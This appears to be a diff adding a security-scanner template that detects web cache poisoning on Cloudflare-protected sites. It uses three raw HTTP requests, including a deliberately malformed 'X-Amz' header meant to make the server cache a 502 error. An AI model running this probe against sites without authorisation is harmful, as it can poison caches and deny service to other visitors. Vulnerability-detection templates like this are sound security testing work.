@@ -1,0 +1,57 @@
+id: cloudflare-cache-poisoning-x-amz-malformed
+
+info:
+  name: Cloudflare Cache Poisoning via malformed X-Amz header
+  author: cWave
+  severity: high
+  description: |
+    Detects cache poisoning vulnerabilities in targets protected by Cloudflare.
+  reference:
+    - https://portswigger.net/web-security/web-cache-poisoning
+    - https://cpdos.org/
+  classification:
+    cwe-id: CWE-444
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L
+    cvss-score: 6.5
+  metadata:
+    max-request: 12
+    verified: true
+  tags: cache,poisoning,cloudflare,http
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 502"
+        internal: true
+
+  - raw:
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        X-Amz-Cwave=1: a
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 502"
+        internal: true
+
+  - raw:
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 502"
+
